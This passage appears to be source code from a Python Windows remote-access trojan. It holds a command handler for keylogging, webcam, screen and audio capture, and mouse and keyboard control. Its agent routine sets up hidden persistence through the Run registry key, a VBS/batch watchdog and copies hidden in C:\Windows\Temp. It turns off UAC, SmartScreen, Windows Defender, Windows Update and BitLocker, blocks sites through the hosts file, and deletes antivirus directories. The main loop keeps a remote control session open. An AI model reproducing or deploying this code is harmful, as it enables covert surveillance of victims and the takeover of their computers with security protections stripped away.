                        continue
            case 'reg':
                send_msg(session, 'Changing or interacting with register')
            case 'sc':
                send_msg(session, 'Changing or interacting with services')        
            case 'schtasks':  
                send_msg(session, 'Changing or interacting with schtasks')    
            case 'secedit':
                send_msg(session, 'Changing or interacting with secedit')     
            case 'wmic':
                send_msg(session, 'Changing or interacting with wmic')  
            case 'winmgmt':        
                send_msg(session, 'Changing or interacting with winmgmt')    
            case 'user':
                send_msg(session, 'Changing or interacting with accounts on this computer')        
            case 'time':
                send_msg(session, 'time -g  -  Get current time\n\ntime -c new time  -  Change current time')
            case 'date':
                send_msg(session, 'date -g  -  Get current date\n\ndate -c new date  -  Change current date')
            case 'reboot':
                send_msg(session, 'start reboot')
                run('shutdown /f /r /t 0'.split(), stdout=DEVNULL, stderr=DEVNULL, shell=True)
                abort()
            case 'shutdown':
                send_msg(session, 'start shutdown')
                run('shutdown /f /s /t 0'.split(), stdout=DEVNULL, stderr=DEVNULL, shell=True)
                abort()
            case 'screenshare': 
                share(session, 0)
            case 'screenshot':
                if screenshot_data := screenshot():
                    session.sendall(screenshot_data)  
                else:
                    session.sendall('Screenshot not taken'.encode())
                    
                clean_folder_file(0)        
            case 'webcamshare': 
                share(session, 1)
            case 'screenshot_webcam': 
                if screenshot_webcam_data := screenshot_webcam():
                    session.sendall(screenshot_webcam_data)  
                else: 
                    session.sendall('Webcam screenshot not taken'.encode())
                
                clean_folder_file(1)
            case 'audioshare': 
                share(session, 2)
            case 'play':
                send_msg(session, 
'''
play -a file path  -  Play audio file\n
play -a -s second  -  Start recording audio\n
play -a -g  -  Get recorded audio\n
play -v -s second  -  Start recording video from screen\n
play -v -g  -  Get recorded video from screen\n
play -w -s second  -  Start recording video from webcam\n
play -w -g  -  Get recorded video from webcam
'''.strip()
                )       
            case 'mouse':
                send_msg(session, 
'''
mouse -g  -  Get current mouse cursor position\n
mouse -x coordinate -y coordinate -i interval  -  Mouse cursor movement\n
mouse -c click -i interval -l  -  Сlick left mouse button\n
mouse -c click -i interval -r  -  Сlick right mouse button\n
mouse -s how much scrolling  -  Mouse scrolling
'''.strip()     
                )        
            case 'keyboard':
                send_msg(session, 
'''
keyboard -t text -i interval  -  Enter text on keyboard\n
keyboard -k key -p press -i interval  -  Press key on keyboard\n
keyboard -h hotkey  -  Press hotkey on keyboard\n
keyboard -d key -s second  -  Hold down key on keyboard\n
keyboard -c -k key -t new key  -  Remap key on keyboard\n
keyboard -c -h hotkey -t new hotkey  -  Remap hotkey on keyboard\n
keyboard -b key  -  Block key on keyboard\n
keyboard -r  -  Restoring keyboard settings
'''.strip()
                )        
            case 'keylogger':
                send_msg(session, 
'''
keylogger -g  -  Get data collected by keylogger\n
keylogger -r  -  Update collected data in keylogger file
'''.strip()
                )
            case 'show':
                send_msg(session, 
'''
show -p title -t text  -  Show push message\n
show -i title -t text  -  Show information message\n
show -w title -t text  -  Show warning message\n
show -e title -t text  -  Show error message
'''.strip()
                )                
            case _: 
                return
    except BaseException as error:
        send_msg(session, 
            f'Why: An error occurred while processing this command\n({command})\nType: {type(error).__name__}\nDescription: {error}')

    sleep(0.5)


def agent(mode=1): 


    def support_bot():
        with open(rf'{PATH}\config\script.vbs', 'w') as script_vbs:
            script_vbs.write(f'Set WshShell = CreateObject("WScript.Shell")\nWshShell.Run "{PATH}\\config\\kernel.bat", 0, False')

        with open(rf'{PATH}\config\kernel.bat', 'w') as script_vbs:
            script_vbs.write(rf'''
@echo off
setlocal
set "APP_NAME={BOT_NAME}"
set "APP_PATH={BOT_PATH}"
set "ALT_APP_PATH=C:\Windows\Temp\{BOT_NAME}"  
set "FLAG_FILE={PATH}\config\kernel.flag"
:loop
echo 1 > "%FLAG_FILE%"
tasklist /FI "IMAGENAME eq %APP_NAME%" | find /I "%APP_NAME%" >nul
if errorlevel 1 (
    if exist "%APP_PATH%" (
        start "" "%APP_PATH%"
    ) else (
        if exist "%ALT_APP_PATH%" (
            start "" "%ALT_APP_PATH%"
        )
    )
)
timeout /t 3 /nobreak >nul
goto loop
'''.strip())
        
        startfile(rf'{PATH}\config\script.vbs')


    def set_autorun():
        try:
            with OpenKey(HKEY_CURRENT_USER, RUN_KEY, 0, KEY_SET_VALUE) as key:
                SetValueEx(key, BOT_NAME_REG, 0, REG_SZ, f'"{BOT_PATH}"')
        except:
            return


    def check_and_restore_run():
        try:
            with OpenKey(HKEY_CURRENT_USER, RUN_KEY, 0, KEY_READ) as key:
                value, _ = QueryValueEx(key, BOT_NAME_REG)

                if value.strip() != f'"{BOT_PATH}"':
                    set_autorun()
        except:
            set_autorun()


    def check_and_reset():
        try:
            with OpenKey(HKEY_CURRENT_USER, SA_KEY, 0, KEY_READ | KEY_WRITE) as key:
                data, _ = QueryValueEx(key, BOT_NAME_REG)

                if isinstance(data, bytes) and len(data) > 0 and data[0] == 3:
                    DeleteValue(key, BOT_NAME_REG)
                    set_autorun()
        except:
            return
        
    try:
        support_bot()
    except: ...

    counter_support_bot = 1

    try:
        if run('wmic OS'.split(), stdout=DEVNULL, stderr=DEVNULL, shell=True).returncode == 1:
            try: 
                with open(rf'{PATH}\config\FEDD-9D37-A64B-4CD2-9428-C0C2-BCC6-A8C6', 'r') as wmic_file:
                    wmic_installed = wmic_file.read().strip()
            except: 
                wmic_installed = 'WMIC IS NOT INSTALLED'
            
            if not wmic_installed == '1':
                run('winmgmt /salvagerepository'.split(), stdout=DEVNULL, stderr=DEVNULL, shell=True)
                run('winmgmt /verifyrepository'.split(), stdout=DEVNULL, stderr=DEVNULL, shell=True)
                run('winmgmt /resetrepository'.split(), stdout=DEVNULL, stderr=DEVNULL, shell=True)

                with open(rf'{PATH}\config\FEDD-9D37-A64B-4CD2-9428-C0C2-BCC6-A8C6', 'w') as wmic_file: 
                    wmic_file.write('1')
        else:
            with open(rf'{PATH}\config\FEDD-9D37-A64B-4CD2-9428-C0C2-BCC6-A8C6', 'w') as wmic_file: 
                wmic_file.write('0')
    except: ...

    while True:
        try:
            with open(rf'{PATH}\config\D3S7-C504-B97D-4CBE-BEB9-83DC-C1B6-4V61', 'r') as module_status_file: 
                if module_status_file.read().strip() == '0': 
                    return
        except: ...

        try:
            if counter_support_bot % 3 == 0:
                with open(rf'{PATH}\config\kernel.flag', 'r') as kernel_flag:
                    if kernel_flag.read().strip() != '1':
                        support_bot()
        except: ...

        try: 
            for onefile in glob(rf'C:\Users\{getlogin()}\AppData\Local\Temp\*'):
                try:
                    if 'onefile' in onefile:  
                        run(f'attrib +h +s +r {onefile}'.split(), stdout=DEVNULL, stderr=DEVNULL, shell=True)
                except: 
                    continue    
        except: ...
        
        try:  
            for reg_directory in [
                (r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System', None, None, None, 0), 
                (r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Associations', None, None, None, 0), 
                (r'SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer', None, None, None, 0), 
                (r'SOFTWARE\Policies\Microsoft\Windows\System', None, None, None, 0), 
                (r'SOFTWARE\Policies\Microsoft\Windows Defender', None, None, None, 0), 
                (r'SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection', None, None, None, 0), 
                (r'SOFTWARE\Policies\Microsoft\Windows Defender\Spynet', None, None, None, 0), 
                (r'SYSTEM\CurrentControlSet\Services\mpssvc', None, None, None, 0), 
                (r'SOFTWARE\Microsoft\Windows Defender Security Center\Notifications', None, None, None, 0), 
                (r'SOFTWARE\Policies\Microsoft\Windows Defender Security Center', None, None, None, 0), 
                (r'SYSTEM\CurrentControlSet\Services\SecurityHealthService', None, None, None, 0), 
                (r'SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications', None, None, None, 0), 
                (r'SYSTEM\CurrentControlSet\Services\MDCoreSvc', None, None, None, 0), 
                (r'SYSTEM\CurrentControlSet\Services\WinDefend', None, None, None, 0), 
                (r'SYSTEM\CurrentControlSet\Services\Sense ', None, None, None, 0), 
                (r'SYSTEM\CurrentControlSet\Services\WdBoot', None, None, None, 0), 
                (r'SYSTEM\CurrentControlSet\Services\WdFilter', None, None, None, 0), 
                (r'SYSTEM\CurrentControlSet\Services\WdNisDrv', None, None, None, 0), 
                (r'SYSTEM\CurrentControlSet\Services\WdNisSvc', None, None, None, 0), 
                (r'SYSTEM\CurrentControlSet\Services\wscsvc', None, None, None, 0), 
                (r'SYSTEM\CurrentControlSet\Services\wuauserv', None, None, None, 0), 
                (r'SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate', None, None, None, 0), 
                (r'SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU', None, None, None, 0), 
                (r'SYSTEM\CurrentControlSet\Services\BDESVC', None, None, None, 0), 
                (r'SYSTEM\CurrentControlSet\Services\Winmgmt', None, None, None, 0), 
                (r'SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced', None, None, None, 0), 
                (r'SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications', None, None, None, 0)
            ]:                   
                try: 
                    if (
                        reg_directory[0] == r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Associations'
                        ) or (reg_directory[0] == r'SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced'
                    ) or reg_directory[0] == r'SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications':
                        regedit(*reg_directory, current_user=True) 
                    else: 
                        regedit(*reg_directory)
                except: 
                    continue 
        except: ... 

        try: 
            for reg_value in [
                (r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System', 'EnableLUA', 0, 0, 1), 
                (r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Associations', 'LowRiskFileTypes', '.zip;.rar;.nfo;.txt;.exe;.bat;.vbs;.com;.cmd;.reg;.msi;.htm;.html;.gif;.bmp;.jpg;.avi;.mpg;.mpeg;.mov;.mp3;.m3u;.wav;', 1, 1), 
                (r'SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer', 'SmartScreenEnabled', 'Off', 1, 1), 
                (r'SOFTWARE\Policies\Microsoft\Windows\System', 'EnableSmartScreen', 0, 0, 1), 
                (r'SOFTWARE\Policies\Microsoft\Windows Defender', 'DisableAntiSpyware', 1, 0, 1), 
                (r'SOFTWARE\Policies\Microsoft\Windows Defender', 'AllowFastServiceStartup', 0, 0, 1), 
                (r'SOFTWARE\Policies\Microsoft\Windows Defender', 'ServiceKeepAlive', 0, 0, 1), 
                (r'SOFTWARE\Policies\Microsoft\Windows Defender', 'DisableAntiVirus', 1, 0, 1), 
                (r'SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection', 'DisableIOAVProtection', 1, 0, 1), 
                (r'SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection', 'DisableRealtimeMonitoring', 1, 0, 1), 
                (r'SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection', 'DisableOnAccessProtection', 1, 0, 1), 
                (r'SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection', 'DisableScanOnRealtimeEnable', 1, 0, 1), 
                (r'SOFTWARE\Policies\Microsoft\Windows Defender\Spynet', 'DisableBlockAtFirstSeen', 1, 0, 1), 
                (r'SOFTWARE\Policies\Microsoft\Windows Defender\Spynet', 'LocalSettingOverrideSpynetReporting', 0, 0, 1), 
                (r'SOFTWARE\Policies\Microsoft\Windows Defender\Spynet', 'SubmitSamplesConsent', 2, 0, 1), 
                (r'SYSTEM\CurrentControlSet\Services\WinDefend', 'Start', 4, 0, 1), 
                (r'SYSTEM\CurrentControlSet\Services\MDCoreSvc', 'Start', 4, 0, 1), 
                (r'SYSTEM\CurrentControlSet\Services\Sense', 'Start', 4, 0, 1), 
                (r'SYSTEM\CurrentControlSet\Services\WdBoot', 'Start', 4, 0, 1), 
                (r'SYSTEM\CurrentControlSet\Services\WdFilter', 'Start', 4, 0, 1), 
                (r'SYSTEM\CurrentControlSet\Services\WdNisDrv', 'Start', 4, 0, 1), 
                (r'SYSTEM\CurrentControlSet\Services\WdNisSvc', 'Start', 4, 0, 1), 
                (r'SYSTEM\CurrentControlSet\Services\wscsvc', 'Start', 4, 0, 1), 
                (r'SYSTEM\CurrentControlSet\Services\SecurityHealthService', 'Start', 4, 0, 1), 
                (r'SYSTEM\CurrentControlSet\Services\mpssvc', 'Start', 4, 0, 1), 
                (r'SOFTWARE\Microsoft\Windows Defender Security Center\Notifications', 'DisableNotifications', 1, 0, 1), 
                (r'SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications', 'DisableNotifications', 1, 0, 1), 
                (r'SYSTEM\CurrentControlSet\Services\wuauserv', 'Start', 4, 0, 1), 
                (r'SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate', 'DisableOSUpgrade', 1, 0, 1), 
                (r'SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate', 'DisableWindowsUpdateAccess', 1, 0, 1), 
                (r'SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate', 'DoNotConnectToWindowsUpdateInternetLocations', 1, 0, 1), 
                (r'SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate', 'UpdateServiceUrlAlternate', 'server.wsus', 1, 1), 
                (r'SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate', 'WUServer', 'server.wsus', 1, 1), 
                (r'SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate', 'WUStatusServer', 'server.wsus', 1, 1), 
                (r'SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU', 'NoAutoUpdate', 1, 0, 1), 
                (r'SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU', 'UseWUServer', 1, 0, 1), 
                (r'SYSTEM\CurrentControlSet\Services\BDESVC', 'Start', 4, 0, 1), 
                (r'SYSTEM\CurrentControlSet\Services\Winmgmt', 'Start', 3, 0, 1), 
                (r'SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced', 'Hidden', 0, 0, 1), 
                (r'SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced', 'ShowSuperHidden', 0, 0, 1), 
                (r'SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications', 'ToastEnabled', 1, 0, 1)
            ]:
                try: 
                    if (
                        reg_value[0] == r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Associations'
                        ) or (reg_value[0] == r'SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced'
                    ) or reg_value[0] == r'SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications':
                        regedit(*reg_value, current_user=True) 
                    else: 
                        regedit(*reg_value)
                except: 
                    continue 
        except: ...

        try: 
            if not exists(PATH): 
                mkdir(PATH)
                run(f'attrib +h +s +r {PATH}'.split(), stdout=DEVNULL, stderr=DEVNULL, shell=True)
        except: ...

        try:
            check_and_restore_run()
            check_and_reset()
        except: ...

        try:
            if not exists(rf'C:\Windows\Temp\{BOT_NAME}'): 
                copy_path(BOT_NAME, rf'C:\Windows\Temp\{BOT_NAME}')
                run(rf'attrib +h +s +r C:\Windows\Temp\{BOT_NAME}'.split(), 
                    stdout=DEVNULL, stderr=DEVNULL, shell=True)
        except: ...

        try:
            if not exists(BOT_NAME): 
                copy_path(rf'C:\Windows\Temp\{BOT_NAME}', BOT_NAME)
        except: ...

        try: 
            if not exists(r'C:\Windows\System32\drivers\etc'): 
                mkdir(r'C:\Windows\System32\drivers\etc')
        except: ...

        try: 
            if not exists(r'C:\Windows\System32\drivers\etc\hosts'): 
                block_site(restart=True)
        except: ...

        try:
            with open(r'C:\Windows\System32\drivers\etc\hosts', 'r+') as hosts:
                hosts_data = hosts.read()

                for site_name in DOMAINS:
                    if not site_name in hosts_data: 
                        hosts.write(f'127.0.0.1       {site_name}\n')
        except: ...

        try:
            for directory_setup_antiviruses_and_tools in antivirus_and_tools_directories:
                try: 
                    delete_setup_antiviruses_and_tools(directory_setup_antiviruses_and_tools)
                except: 
                    continue
        except: ...

        try:
            with open(rf'{PATH}\config\kernel.flag', 'w') as kernel_flag:
                kernel_flag.write('0')
            
            counter_support_bot += 1
        except: ...

        try:
            if mode == 1: 
                module_report(rf'{PATH}\config\D3S7-C504-B97D-4CBE-BEB9-83DC-C1B6-4V61')
        except: ...

        try: 
            sleep(3) 
        except: ...


def main():
    try: 
        init()
    except: ...

    try: 
        get_bot_path_directory()
    except: ...
    
    try: 
        start_modules()
    except: ...

    try: 
        start_apps()
    except: ...

    while True:
        try:
            try: 
                create_session()
            except: 
                sleep(10)
        except: 
            continue


main()